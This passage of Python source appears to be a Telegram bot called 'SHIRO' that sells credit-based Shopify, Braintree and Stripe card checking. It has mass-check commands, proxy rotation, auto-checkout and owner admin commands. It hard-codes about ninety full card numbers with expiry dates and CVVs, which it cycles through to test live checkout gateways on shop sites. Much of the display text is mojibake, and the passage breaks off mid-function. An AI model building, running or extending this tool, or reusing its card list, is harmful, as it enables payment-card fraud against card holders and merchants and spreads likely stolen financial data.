        types.InlineKeyboardButton("Ã¢â€”â€  ÃªÅ“Â±Ã¡Â´â€ºÃ¡Â´â‚¬Ã¡Â´â€ºÃªÅ“Â±", callback_data="menu_stats"),
        types.InlineKeyboardButton("Ã¢â€”â€  Ã¡Â´ËœÃŠÅ¸Ã¡Â´â‚¬Ã‰Â´ÃªÅ“Â±", callback_data="menu_plans"),
    )
    # Third row: API | Utilities
    kb.row(
        types.InlineKeyboardButton("Ã¢â€”â€  Ã¡Â´â‚¬Ã¡Â´ËœÃ‰Âª", callback_data="menu_gates"),
        types.InlineKeyboardButton("Ã¢â€”â€  Ã¡Â´Å“Ã¡Â´â€ºÃ‰ÂªÃŠÅ¸Ã‰ÂªÃ¡Â´â€ºÃ‰ÂªÃ¡Â´â€¡ÃªÅ“Â±", callback_data="menu_utils"),
    )
    # Fourth row: Support (full width)
    kb.add(types.InlineKeyboardButton("Ã¢â€”â€  ÃªÅ“Â±Ã¡Â´Å“Ã¡Â´ËœÃ¡Â´ËœÃ¡Â´ÂÃŠâ‚¬Ã¡Â´â€º", callback_data="menu_support"))
    return kb


def _make_toolbox_keyboard():
    """Toolbox sub-menu: commands list + Sites / Proxies / Check shortcuts."""
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.row(
        types.InlineKeyboardButton("Ã°Å¸Å’Â Shopify Sites", callback_data="menu_sitelist"),
        types.InlineKeyboardButton("Ã°Å¸â€Â· BT Sites", callback_data="menu_btsitelist"),
    )
    kb.row(
        types.InlineKeyboardButton("Ã°Å¸â€â€ž Proxies", callback_data="menu_proxylist"),
        types.InlineKeyboardButton("Ã°Å¸Â§Âª Test Proxies", callback_data="menu_checkproxy"),
    )
    kb.row(
        types.InlineKeyboardButton("Ã¢Å¾â€¢ Add Site", callback_data="menu_setsite"),
        types.InlineKeyboardButton("Ã¢Å¾â€¢ Add BT Site", callback_data="menu_btsetsite"),
    )
    kb.row(
        types.InlineKeyboardButton("Ã¢Å¾â€¢ Add Proxies", callback_data="menu_setproxies"),
        types.InlineKeyboardButton("Ã¢Å¡Â¡ Auto-Checkout", callback_data="menu_ac"),
    )
    kb.add(types.InlineKeyboardButton("Ã¢Â¬â€¦Ã¯Â¸Â Back", callback_data="menu_back"))
    return kb


def _start_welcome_text():
    return (
        "<b>SHIRO</b>\n"
        "<i>Shopify Ã‚Â· Braintree Ã‚Â· Stripe checker</i>\n\n"
        "Register to use the bot. You get <b>100 credits</b> on signup.\n"
        f"1 credit per check Ã‚Â· mass check max {MASS_MAX_CARDS} cards."
    )


def _send_start_image(chat_id, caption=None, reply_markup=None):
    """Send Shiro banner image with inline keyboard attached. Much faster than GIF."""
    global _cached_image_file_id
    
    # Load from MongoDB if not in memory
    if _cached_image_file_id is None:
        _cached_image_file_id = _load_cached_image_file_id()
    
    # Try using cached file_id first (instant send)
    if _cached_image_file_id:
        try:
            bot.send_photo(chat_id, _cached_image_file_id, caption=caption or "", parse_mode="HTML" if caption else None, reply_markup=reply_markup)
            return
        except Exception as e:
            # Cache invalid, will re-download
            _cached_image_file_id = None
    
    import tempfile
    import os
    path = None
    
    try:
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"}
        # Short timeout for faster fallback
        with httpx.Client(follow_redirects=True, timeout=5, headers=headers) as client:
            r = client.get(SHIRO_BANNER_IMAGE_URL)
            if r.status_code == 200 and r.content and len(r.content) <= 10_000_000:
                path = tempfile.mktemp(suffix=".jpg")
                with open(path, "wb") as f:
                    f.write(r.content)
                with open(path, "rb") as f:
                    msg = bot.send_photo(chat_id, f, caption=caption or "", parse_mode="HTML" if caption else None, reply_markup=reply_markup)
                    # Cache the file_id for future instant sends
                    if msg and msg.photo:
                        _cached_image_file_id = msg.photo[-1].file_id
                        # Save to MongoDB for persistence
                        _save_cached_image_file_id(_cached_image_file_id)
                try:
                    os.unlink(path)
                except Exception:
                    pass
                return
    except Exception:
        pass
    finally:
        if path and os.path.exists(path):
            try:
                os.unlink(path)
            except Exception:
                pass
    
    # Fallback: send text message instead (instant)
    if caption:
        bot.send_message(chat_id, caption, parse_mode="HTML", reply_markup=reply_markup)
    elif reply_markup:
        bot.send_message(chat_id, "Ã°Å¸ÂÂ¾ <b>Shiro Online</b>", parse_mode="HTML", reply_markup=reply_markup)


def _auto_join_user(user_id):
    """Automatically send invite links to user for channel and/or group."""
    if not AUTO_JOIN_CHANNEL and not AUTO_JOIN_GROUP:
        return
    
    # Try to send channel invite
    if AUTO_JOIN_CHANNEL:
        try:
            # Create invite link for channel
            invite_link = bot.create_chat_invite_link(
                AUTO_JOIN_CHANNEL,
                member_limit=1,
                expire_date=int(time.time()) + 3600  # 1 hour expiry
            )
            
            # Send invite link to user
            msg = (
                "Ã°Å¸â€œÂ¢ " + _to_bold_sans("JOIN OUR CHANNEL") + "\n\n"
                "Ã°Å¸â€â€” " + _to_bold_sans("CLICK TO JOIN:") + f" {invite_link.invite_link}\n\n"
                "Ã°Å¸â€™Â¡ " + _to_bold_sans("GET UPDATES, CODES & MORE!")
            )
            bot.send_message(user_id, msg, parse_mode="HTML")
            
            if DEBUG:
                print(f"[AutoJoin] Sent channel invite to user {user_id}")
        except Exception as e:
            if DEBUG:
                print(f"[AutoJoin] Failed to invite user {user_id} to channel: {e}")
    
    # Try to send group invite
    if AUTO_JOIN_GROUP:
        try:
            # Create invite link for group
            invite_link = bot.create_chat_invite_link(
                AUTO_JOIN_GROUP,
                member_limit=1,
                expire_date=int(time.time()) + 3600  # 1 hour expiry
            )
            
            # Send invite link to user
            msg = (
                "Ã°Å¸â€˜Â¥ " + _to_bold_sans("JOIN OUR GROUP") + "\n\n"
                "Ã°Å¸â€â€” " + _to_bold_sans("CLICK TO JOIN:") + f" {invite_link.invite_link}\n\n"
                "Ã°Å¸â€™Â¬ " + _to_bold_sans("CHAT WITH OTHER USERS!")
            )
            bot.send_message(user_id, msg, parse_mode="HTML")
            
            if DEBUG:
                print(f"[AutoJoin] Sent group invite to user {user_id}")
        except Exception as e:
            if DEBUG:
                print(f"[AutoJoin] Failed to invite user {user_id} to group: {e}")


# Ã¢â€â‚¬Ã¢â€â‚¬ Middleware: block all non-owner users while UPDATING_MODE is on Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
@bot.middleware_handler(update_types=['message'])
def _updating_message_middleware(bot_instance, message):
    global UPDATING_MODE
    if UPDATING_MODE:
        uid = getattr(message.from_user, "id", None)
        # Let the owner through
        if uid in OWNER_IDS:
            return
        # Block everyone else
        try:
            bot_instance.reply_to(
                message,
                "Ã¢Å¡â„¢Ã¯Â¸Â <b>" + _to_bold_sans("BOT IS CURRENTLY UPDATING") + "</b>\n\n"
                + _to_bold_sans("PLEASE TRY AGAIN LATER."),
                parse_mode="HTML"
            )
        except Exception:
            pass
        # Cancel the update to prevent command execution
        if CancelUpdate is not None:
            return CancelUpdate()
        # Fallback: return False to stop processing
        return False


@bot.middleware_handler(update_types=['callback_query'])
def _updating_callback_middleware(bot_instance, call):
    global UPDATING_MODE
    if UPDATING_MODE:
        uid = getattr(call.from_user, "id", None)
        if uid in OWNER_IDS:
            return
        # Block everyone else
        try:
            bot_instance.answer_callback_query(
                call.id,
                "Ã¢Å¡â„¢Ã¯Â¸Â Bot is currently updating. Please try again later.",
                show_alert=True
            )
        except Exception:
            pass
        # Cancel the update to prevent callback execution
        if CancelUpdate is not None:
            return CancelUpdate()
        # Fallback: return False to stop processing
        return False


@bot.message_handler(commands=["start"])
@_crash_safe
def cmd_start(message):
    cid = message.chat.id
    uid = getattr(message.from_user, "id", None)
    _log_cmd(message, "/start")
    
    # Auto-join user to channel/group
    if uid:
        _auto_join_user(uid)
    
    # Use the same keyboard for everyone - instant, no DB check
    kb = _make_main_menu_keyboard()
    
    # Send image with keyboard (uses cached file_id after first time)
    _send_start_image(cid, caption="<b>ÃªÅ“Â±ÃŠÅ“Ã‰ÂªÃŠâ‚¬Ã¡Â´Â ÃªÅ“Â±ÃŠÂÃªÅ“Â±Ã¡Â´â€ºÃ¡Â´â€¡Ã¡Â´Â</b>\n\n<i>ÃªÅ“Â±ÃŠÅ“Ã¡Â´ÂÃ¡Â´ËœÃ‰ÂªÃªÅ“Â°ÃŠÂ Ã‚Â· ÃŠâ„¢ÃŠâ‚¬Ã¡Â´â‚¬Ã‰ÂªÃ‰Â´Ã¡Â´â€ºÃŠâ‚¬Ã¡Â´â€¡Ã¡Â´â€¡ Ã‚Â· ÃªÅ“Â±Ã¡Â´â€ºÃŠâ‚¬Ã‰ÂªÃ¡Â´ËœÃ¡Â´â€¡</i>\n\nÃªÅ“Â±Ã¡Â´â€¡ÃŠÅ¸Ã¡Â´â€¡Ã¡Â´â€žÃ¡Â´â€º Ã¡Â´â‚¬Ã‰Â´ Ã¡Â´ÂÃ¡Â´ËœÃ¡Â´â€ºÃ‰ÂªÃ¡Â´ÂÃ‰Â´ ÃŠâ„¢Ã¡Â´â€¡ÃŠÅ¸Ã¡Â´ÂÃ¡Â´Â¡", reply_markup=kb)


@bot.message_handler(commands=["register"])
@_crash_safe
def cmd_register(message):
    uid = getattr(message.from_user, "id", None)
    _log_cmd(message, "/register")
    if not uid:
        bot.reply_to(message, "Could not get user ID.")
        return
    if is_registered(uid):
        cred = get_credits(uid)
        # Update activity on every interaction
        update_user_activity(uid, username=getattr(message.from_user, "username", None), first_name=getattr(message.from_user, "first_name", None))
        bot.reply_to(message, f"Already registered. Credits: <b>{cred}</b>", parse_mode="HTML")
        return
    uname = getattr(message.from_user, "username", None)
    fname = getattr(message.from_user, "first_name", None)
    if register_user(uid, username=uname, first_name=fname):
        welcome_msg = (
            "Ã°Å¸Å½â€° " + _to_bold_sans("WELCOME TO SHIRO") + " Ã°Å¸Å½â€°\n\n"
            "Ã¢Å“â€¦ " + _to_bold_sans("REGISTRATION SUCCESSFUL") + "\n"
            "Ã°Å¸â€™Â³ " + _to_bold_sans("INITIAL CREDITS:") + f" <b>{INITIAL_CREDITS}</b>\n\n"
            "Ã°Å¸Å¡â‚¬ " + _to_bold_sans("GET STARTED:") + "\n"
            "Ã¢â€“Â¸ " + _to_bold_sans("USE") + " /sh " + _to_bold_sans("TO CHECK CARDS") + "\n"
            "Ã¢â€“Â¸ " + _to_bold_sans("USE") + " /msh " + _to_bold_sans("FOR MASS CHECKS") + "\n"
            "Ã¢â€“Â¸ " + _to_bold_sans("USE") + " /setsite " + _to_bold_sans("TO ADD SITES") + "\n\n"
            "Ã°Å¸â€™Å½ " + _to_bold_sans("NEED MORE CREDITS?") + "\n"
            "Ã¢â€“Â¸ " + _to_bold_sans("USE") + " /redeem " + _to_bold_sans("WITH A CODE") + "\n\n"
            "Ã¢ÂÂ¤Ã¯Â¸Â " + _to_bold_sans("HAPPY CHECKING!")
        )
        bot.reply_to(message, welcome_msg, parse_mode="HTML")
    else:
        bot.reply_to(message, "Registration failed (DB error).")


_SITE_TEST_CCS = [
    "4842810238427997|10|28|572","4678940125984104|02|28|655","4842810330744984|06|28|389",
    "4234900200020932|05|28|130","4293205205373874|10|30|243","4506180039169942|12|27|070",
    "4234900200196401|10|28|771","4842810731201881|08|28|484","4617729021800546|01|29|229",
    "4966230339606094|08|27|720","4570665015100300|09|28|168","4386759014396888|05|29|532",
    "4585813600449798|08|27|958","4842810530795968|01|29|326","4460320038322779|02|28|734",
    "4032658882868697|02|27|373","4364800000239959|12|26|650","4585813600703731|03|29|278",
    "4730570996800703|10|26|637","4902820010629899|08|30|087","379185135932533|03|29|739",
    "5520408432144611|08|28|268","5156970000212717|08|28|545",
    "4966230236202757|05|27|922","379186131023160|04|28|231",
    "4658858800497784|10|27|537","4234900200656446|06|29|877","4386680030331131|02|26|393",
    "4539669013496587|06|27|977","4259585002743920|04|26|495","4687862808704253|11|29|614",
    "4585819998878647|03|29|688","5521152702766773|08|28|295","4658858800365973|04|27|329",
    "4293200004479840|11|31|598","4599144104574970|10|27|337","4293205223826754|03|29|660",
    "4366880014535103|07|26|431","4617729015742019|08|27|457","4599144104540120|09|27|710",
    "4842810830479453|01|27|929","4665381091028300|06|27|885","5180981000205692|07|29|186",
    "4382890003926247|12|27|573","4585819998956120|10|27|899","5460150032661907|03|28|249",
    "4687862805019036|12|31|623","4935310199681102|01|27|333","4902820019733874|02|31|381",
    "4216450001016434|05|28|289","5524091100119044|04|29|829","4293209208568068|05|30|299",
    "4563060211194209|10|27|525","5268523000141769|05|29|868","4234900200402882|02|29|521",
    "4366880054611103|06|26|702","5521154008467320|08|26|048","4842810530694997|07|28|069",
    "5239450130355521|02|28|207","5460150031313443|03|29|140","4293205202992841|10|30|204",
    "5157039077971768|09|29|848","4141700005884017|04|29|346","4570662800484932|04|28|805",
    "5268523000200151|05|29|652","4966230033414449|12|27|351","4599144104749556|02|28|329",
    "4258608306797086|07|26|126","5521154009578000|10|28|617","4141700008053339|02|29|477",
    "4028156002315497|09|31|757","5521154008827218|11|27|203","376280010027609|03|29|389",
    "4553880130443102|06|27|168","4687862800844107|12|30|837",
    "5521159002125980|05|26|303","5521159003470708|09|29|311","5523340000110277|05|26|903",
    "5243120031668843|05|29|611","4384213000249992|04|29|864","5523021641045359|10|27|686",
    "4259585002668762|10|26|846","5523330000739811|07|29|949","4032658882922510|10|26|607",
    "4002154564771108|04|28|657","5521154007962511|12|26|094","376249736076323|04|27|884",
    "4599144104790220|02|28|758","4297544010605559|12|26|842",
    "5521152790112005|05|27|020","4794460003820444|07|28|254",
]
_site_cc_idx = 0
_site_cc_lock = threading.Lock()

def _next_site_test_cc():
    """Get next CC from the pool (round-robin)."""
    global _site_cc_idx
    with _site_cc_lock:
        cc = _SITE_TEST_CCS[_site_cc_idx % len(_SITE_TEST_CCS)]
        _site_cc_idx += 1
    return cc

def _test_and_save_sites(cid, raw_lines, status_msg=None):
    """Two-phase site validation:
    1) products.json check for in-stock items in price range
    2) Single CC attempt per site Ã¢â‚¬â€ Declined/3DS/CVC/Charged = working gateway
    """
    sites_to_test = []
    for s in raw_lines:
        s = (s or "").strip().rstrip("/")
        if not s:
            continue
        if not s.startswith(("http://", "https://")):
            s = "https://" + s
        sites_to_test.append(s)
    if not sites_to_test:
        return [], []
    
    proxies = get_proxies(cid)
    proxy = random.choice(proxies) if proxies else None
    
    # Ã¢â€â‚¬Ã¢â€â‚¬ Phase 1: products.json Ã¢â€â‚¬Ã¢â€â‚¬
    if status_msg:
        try:
            bot.edit_message_text(f"Ã°Å¸â€Â Phase 1/2: Checking {len(sites_to_test)} site(s) for products ${MIN_SITE_PRICE:.0f}-${MAX_SITE_PRICE:.0f}...", cid, status_msg.message_id)
        except Exception:
            pass
    
    workers = min(8, len(sites_to_test))
    phase1_ok = []
    dead_sites = []
    site_info = {}
    
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {ex.submit(_check_site_with_info, site, proxy): site for site in sites_to_test}
        for future in as_completed(futures):
            site = futures[future]
            try:
                result = future.result()
                if result and result.get("ok") and result.get("available"):
                    phase1_ok.append(site)
                    site_info[site] = result
                else:
                    dead_sites.append(site)
                    if result:
                        site_info[site] = result
            except Exception as e:
                dead_sites.append(site)
                site_info[site] = {"error": str(e)[:50]}
    
    # Ã¢â€â‚¬Ã¢â€â‚¬ Phase 2: 1 CC per site, 1 attempt Ã¢â€â‚¬Ã¢â€â‚¬
    working_sites = []
    cc_dead = []
    
    if phase1_ok:
        if status_msg:
            try:
                bot.edit_message_text(f"Ã°Å¸â€Â Phase 2/2: CC validation on {len(phase1_ok)} site(s)...", cid, status_msg.message_id)
            except Exception:
                pass
        
        def _cc_test_one(site):
            cc = _next_site_test_cc()
            px = _pick_proxy(proxies) if proxies else None
            try:
                result = run_check_sync(site, cc, px, timeout=SITE_TEST_CC_TIMEOUT, max_captcha_retries=0)
                st = (result or {}).get("status", "Error")
                code = str((result or {}).get("error_code", "")).upper()
                msg = str((result or {}).get("message", "")).upper()
                # Use real Shopify processingError.code to validate gateway
                # Any card-related response = gateway is alive
                if st == "Charged":
                    return True
                if st == "Approved":
                    return True
                if st == "Declined":
                    return True
                # CAPTCHA/Checkpoint means gateway reached checkout = site works
                if code == "CAPTCHA_REQUIRED" or "CAPTCHA" in code or "CHECKPOINT" in code:
                    return True
                if "CAPTCHA" in msg or "CHECKPOINT" in msg:
                    return True
                # Throttled = Shopify rate-limited us, but site is alive
                if code == "THROTTLED":
                    return True
                return False
            except Exception:
                return False
        
        cc_workers = min(8, len(phase1_ok))
        with ThreadPoolExecutor(max_workers=cc_workers) as ex:
            futures = {ex.submit(_cc_test_one, site): site for site in phase1_ok}
            for future in as_completed(futures):
                site = futures[future]
                try:
                    if future.result():
                        working_sites.append(site)
                    else:
                        cc_dead.append(site)
                        site_info.setdefault(site, {})["cc_error"] = "Gateway dead"
                except Exception:
                    cc_dead.append(site)
    
    all_dead = dead_sites + cc_dead
    set_sites(cid, working_sites)
    
    if status_msg:
        try:
            if working_sites:
                msg = f"Ã¢Å“â€¦ Saved <b>{len(working_sites)}</b> working site(s)\n"
                if cc_dead:
                    msg += f"Ã¢Å¡Â Ã¯Â¸Â {len(cc_dead)} passed products but dead gateway\n"
                if dead_sites:
                    msg += f"Ã¢ÂÅ’ {len(dead_sites)} no valid products\n"
                msg += "\n"
                for site in working_sites[:5]:
                    info = site_info.get(site, {})
                    domain = site.replace("https://", "").replace("http://", "").split("/")[0]
                    product = _esc(info.get("product", ""))[:30]
                    price = _esc(info.get("price", "?"))
                    msg += f"Ã¢â‚¬Â¢ {_esc(domain)}\n  ${price} - {product} Ã¢Å“â€¦\n"
                if len(working_sites) > 5:
                    msg += f"\n+{len(working_sites)-5} more sites"
                bot.edit_message_text(msg, cid, status_msg.message_id, parse_mode="HTML")
            else:
                error_msg = "Ã¢ÂÅ’ No working sites found:\n\n"
                for site in all_dead[:5]:
                    info = site_info.get(site, {})
                    domain = site.replace("https://", "").replace("http://", "").split("/")[0]
                    if info.get("cc_error"):
                        error = "Gateway dead (CC not declined)"
                    elif "error" in info:
                        error = info["error"]
                    elif not info.get("available"):
                        error = "No in-stock products"
                    elif info.get("lowest_price") and info["lowest_price"] > MAX_SITE_PRICE:
                        error = f"Price ${info['lowest_price']:.2f} > max ${MAX_SITE_PRICE:.0f}"
                    elif info.get("lowest_price") and info["lowest_price"] < MIN_SITE_PRICE:
                        error = f"Price ${info['lowest_price']:.2f} < min ${MIN_SITE_PRICE:.0f}"
                    else:
                        error = "No suitable products"
                    error_msg += f"Ã¢â‚¬Â¢ {domain}\n  {_to_bold_sans(error)}\n"
                if len(all_dead) > 5:
                    error_msg += f"\n+{len(all_dead)-5} more failed"
                error_msg += f"\n\n{_to_bold_sans(f'tip: sites need shopify products ${MIN_SITE_PRICE:.0f}-${MAX_SITE_PRICE:.0f}')}"
                bot.edit_message_text(error_msg, cid, status_msg.message_id, parse_mode="HTML")
        except Exception:
            pass
    
    return working_sites, all_dead


# Ã¢â€â‚¬Ã¢â€â‚¬ Updating mode commands (owner only) Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
@bot.message_handler(commands=["updateon"])
@_crash_safe
def cmd_updateon(message):
    """Enable updating/maintenance mode (owner only)."""
    global UPDATING_MODE
    _log_cmd(message, "/updateon")
    if not OWNER_IDS or getattr(message.from_user, "id", None) not in OWNER_IDS:
        bot.reply_to(message, "Owner only.")
        return
    if UPDATING_MODE:
        bot.reply_to(message, "Ã¢Å¡â„¢Ã¯Â¸Â " + _to_bold_sans("UPDATING MODE IS ALREADY ON."), parse_mode="HTML")
        return
    UPDATING_MODE = True
    bot.reply_to(
        message,
        "Ã¢Å¡â„¢Ã¯Â¸Â <b>" + _to_bold_sans("UPDATING MODE ENABLED") + "</b>\n\n"
        + _to_bold_sans("ALL USERS ARE NOW BLOCKED UNTIL YOU USE") + " /updateoff",
        parse_mode="HTML"
    )


@bot.message_handler(commands=["updateoff"])
@_crash_safe
def cmd_updateoff(message):
    """Disable updating/maintenance mode (owner only)."""
    global UPDATING_MODE
    _log_cmd(message, "/updateoff")
    if not OWNER_IDS or getattr(message.from_user, "id", None) not in OWNER_IDS:
        bot.reply_to(message, "Owner only.")
        return
    if not UPDATING_MODE:
        bot.reply_to(message, "Ã¢Å“â€¦ " + _to_bold_sans("UPDATING MODE IS ALREADY OFF."), parse_mode="HTML")
        return
    UPDATING_MODE = False
    bot.reply_to(
        message,
        "Ã¢Å“â€¦ <b>" + _to_bold_sans("UPDATING MODE DISABLED") + "</b>\n\n"
        + _to_bold_sans("BOT IS NOW BACK ONLINE FOR ALL USERS."),
        parse_mode="HTML"
    )


@bot.message_handler(commands=["stopall"])
@_crash_safe
def cmd_stopall(message):
    """Stop all ongoing mass checks immediately (owner only)."""
    global _mass_check_stop_flag
    _log_cmd(message, "/stopall")
    if not OWNER_IDS or getattr(message.from_user, "id", None) not in OWNER_IDS:
        bot.reply_to(message, "Owner only.")
        return
    
    with _mass_count_lock:
        active = _active_mass_checks
        _mass_check_stop_flag = True
    
    if active == 0:
        bot.reply_to(message, "Ã¢Å¡Â Ã¯Â¸Â " + _to_bold_sans("NO ACTIVE MASS CHECKS TO STOP."), parse_mode="HTML")
        _mass_check_stop_flag = False
        return
    
    bot.reply_to(
        message,
        f"Ã°Å¸â€ºâ€˜ <b>" + _to_bold_sans("STOPPING ALL CHECKS") + "</b>\n\n"
        + _to_bold_sans(f"STOPPING {active} ACTIVE MASS CHECK(S)...") + "\n"
        + _to_bold_sans("ALL ONGOING CHECKS WILL BE CANCELLED."),
        parse_mode="HTML"
    )
    
    # Reset flag after 5 seconds to allow new checks
    def _reset_flag():
        time.sleep(5)
        global _mass_check_stop_flag
        _mass_check_stop_flag = False
    
    threading.Thread(target=_reset_flag, daemon=True).start()


@bot.message_handler(commands=["resetdb"])
@_crash_safe
def cmd_resetdb(message):
    """Reset entire database (owner only)."""
    _log_cmd(message, "/resetdb")
    if not OWNER_IDS or getattr(message.from_user, "id", None) not in OWNER_IDS:
        bot.reply_to(message, "Owner only.")
        return
    n = reset_db()
    if n >= 0:
        bot.reply_to(message, f"Database reset. Deleted {n} chat(s).")
    else:
        bot.reply_to(message, "MongoDB not connected. In-memory cleared.")


@bot.message_handler(commands=["cleardb"])
@_crash_safe
def cmd_cleardb(message):
    """Clear all sites/proxies, or clear a specific user. Usage: /cleardb [userid]"""
    _log_cmd(message, "/cleardb", extra=(message.text or "").strip())
    if not OWNER_IDS or getattr(message.from_user, "id", None) not in OWNER_IDS:
        bot.reply_to(message, "Owner only.")
        return

    text = (message.text or "").strip()
    parts = text.split()

    # /cleardb <userid> Ã¢â‚¬â€ clear a specific user's data
    if len(parts) >= 2:
        try:
            target_uid = int(parts[1])
        except ValueError:
            bot.reply_to(message, "Ã¢ÂÅ’ Invalid user ID. Usage: /cleardb <user_id>")
            return

        coll = _users_coll()
        if coll is None:
            bot.reply_to(message, "Ã¢ÂÅ’ Database not connected.")
            return

        doc = coll.find_one({"_id": target_uid})
        if not doc:
            bot.reply_to(message, f"Ã¢ÂÅ’ User <code>{target_uid}</code> not found.", parse_mode="HTML")
            return

        # Show user info before deleting
        creds = doc.get("credits", 0)
        checks = doc.get("total_checks", 0)
        reg = doc.get("registered_at", "N/A")

        coll.delete_one({"_id": target_uid})
        _invalidate_user_cache(target_uid)

        # Also clear their chat sites/proxies
        db, chats_coll = _get_mongo()
        chat_cleared = False
        if chats_coll is not None:
            r = chats_coll.delete_one({"_id": target_uid})
            chat_cleared = r.deleted_count > 0
        if target_uid in user_sites:
            del user_sites[target_uid]
        if target_uid in user_proxies:
            del user_proxies[target_uid]

        response = (
            f"Ã°Å¸â€”â€˜Ã¯Â¸Â <b>User Cleared</b>\n\n"
            f"Ã°Å¸â€˜Â¤ <b>ID:</b> <code>{target_uid}</code>\n"
            f"Ã°Å¸â€™Â° <b>Credits:</b> {creds}\n"
            f"Ã¢Å“â€¦ <b>Checks:</b> {checks}\n"
            f"Ã°Å¸â€œâ€¦ <b>Registered:</b> {reg}\n\n"
            f"Ã¢Å“â€¦ User document deleted\n"
        )
        if chat_cleared:
            response += "Ã¢Å“â€¦ Chat data (sites/proxies) deleted"
        else:
            response += "Ã¢â€žÂ¹Ã¯Â¸Â No chat data found for this user"

        bot.reply_to(message, response, parse_mode="HTML")
        return

    # /cleardb (no args) Ã¢â‚¬â€ clear all sites and proxies
    clear_db()
    bot.reply_to(message, "Ã¢Å“â€¦ Database cleared. All sites and proxies removed.")


@bot.message_handler(commands=["clearcache"])
@_crash_safe
def cmd_clearcache(message):
    """Clear image cache (owner only)."""
    _log_cmd(message, "/clearcache")
    if not OWNER_IDS or getattr(message.from_user, "id", None) not in OWNER_IDS:
        bot.reply_to(message, "Owner only.")
        return
    _clear_cached_image()
    bot.reply_to(message, "Ã¢Å“â€¦ Image cache cleared. Next /start will download new image.")


@bot.message_handler(commands=["cleanusers"])
@_crash_safe
def cmd_cleanusers(message):
    """Remove invalid user IDs from database (owner only)."""
    _log_cmd(message, "/cleanusers")
    if not OWNER_IDS or getattr(message.from_user, "id", None) not in OWNER_IDS:
        bot.reply_to(message, "Owner only.")
        return
    
    coll = _users_coll()
    if coll is None:
        bot.reply_to(message, "Ã¢ÂÅ’ Database not connected.")
        return
    
    status_msg = bot.reply_to(message, "Ã°Å¸Â§Â¹ Cleaning invalid users...")
    
    try:
        # Count invalid users before deletion
        invalid_count = coll.count_documents({"_id": {"$not": {"$type": ["int", "long"]}}})
        
        if invalid_count == 0:
            bot.edit_message_text("Ã¢Å“â€¦ No invalid users found. Database is clean!", message.chat.id, status_msg.message_id)
            return
        
        # Delete all users with non-integer IDs
        result = coll.delete_many({"_id": {"$not": {"$type": ["int", "long"]}}})
        deleted = result.deleted_count
        
        response = (
            f"Ã¢Å“â€¦ Cleanup complete!\n\n"
            f"Ã°Å¸â€”â€˜Ã¯Â¸Â Removed {deleted} invalid user(s)\n"
            f"Ã¢Å“Â¨ Database is now clean with only valid Telegram user IDs"
        )
        
        bot.edit_message_text(response, message.chat.id, status_msg.message_id)
        
    except Exception as e:
        bot.edit_message_text(f"Ã¢ÂÅ’ Cleanup failed: {str(e)[:200]}", message.chat.id, status_msg.message_id)


@bot.message_handler(commands=["syncdb"])
@_crash_safe
def cmd_syncdb(message):
    """Sync database - merge old data with new structure (owner only)."""
    _log_cmd(message, "/syncdb")
    if not OWNER_IDS or getattr(message.from_user, "id", None) not in OWNER_IDS:
        bot.reply_to(message, "Owner only.")
        return
    
    status_msg = bot.reply_to(message, "Ã°Å¸â€â€ž Syncing database...")
    result = sync_database()
    
    if result["success"]:
        response = (
            f"Ã¢Å“â€¦ Database synced successfully!\n\n"
            f"Ã°Å¸â€œÅ  Users: {result['total_users']} valid, {result['users_synced']} updated\n"
            f"Ã°Å¸â€™Â¬ Chats: {result['total_chats']} total, {result['chats_synced']} updated\n"
        )
        if result.get('invalid_users', 0) > 0:
            response += f"\nÃ¢Å¡Â Ã¯Â¸Â {result['invalid_users']} invalid user IDs skipped (not Telegram IDs)\n"
        response += "\nAll valid data from old database has been merged."
    else:
        response = f"Ã¢ÂÅ’ Sync failed: {result.get('error', 'Unknown error')}"
    
    bot.edit_message_text(response, message.chat.id, status_msg.message_id)


@bot.message_handler(commands=["broadcast"])
@_crash_safe
def cmd_broadcast(message):
    """Broadcast message to all registered users (owner only)."""
    _log_cmd(message, "/broadcast")
    if not OWNER_IDS or getattr(message.from_user, "id", None) not in OWNER_IDS:
        bot.reply_to(message, "Owner only.")
        return
    
    text = (message.text or "").strip()
    broadcast_text = text.replace("/broadcast", "").strip()
    
    if not broadcast_text:
        bot.reply_to(
            message,
            "Usage: /broadcast [your message]\n\n"
            "This will send the message to all registered users.\n"
            "You can use HTML formatting in your message.",
            parse_mode=None
        )
        return
    
    # Validate HTML tags to prevent parsing errors
    def _validate_html_tags(text):
        """Ensure all HTML tags are properly closed."""
        import re
        # Find all opening tags
        opening_tags = re.findall(r'<(b|i|u|s|code|pre|a)(?:\s[^>]*)?>', text, re.IGNORECASE)
        # Find all closing tags
        closing_tags = re.findall(r'</(b|i|u|s|code|pre|a)>', text, re.IGNORECASE)
        
        # Count occurrences
        from collections import Counter
        open_count = Counter([tag.lower() for tag in opening_tags])
        close_count = Counter([tag.lower() for tag in closing_tags])
        
        # Check if all tags are balanced
        for tag in open_count:
            if open_count[tag] != close_count.get(tag, 0):
                return False, f"Unbalanced <{tag}> tags: {open_count[tag]} opening, {close_count.get(tag, 0)} closing"
        
        for tag in close_count:
            if tag not in open_count:
                return False, f"Closing </{tag}> tag without opening tag"
        
        return True, None
    
    # Validate the HTML
    is_valid, error_msg = _validate_html_tags(broadcast_text)
    if not is_valid:
        bot.reply_to(
            message,
